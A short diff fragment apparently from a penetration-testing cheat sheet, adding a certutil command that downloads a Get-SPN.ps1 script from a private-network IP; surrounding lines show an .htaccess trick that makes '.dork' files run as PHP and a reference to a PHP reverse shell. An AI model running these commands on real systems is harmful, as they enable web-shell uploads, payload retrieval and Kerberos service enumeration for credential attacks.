@@ -951,6 +951,7 @@ echo "AddType application/x-httpd-php .dork" > .htaccess
 php Ivan Sincek
 
 # 
+certutil -urlcache -split -f http://192.168.45.192/Get-SPN.ps1
 
 ```
 
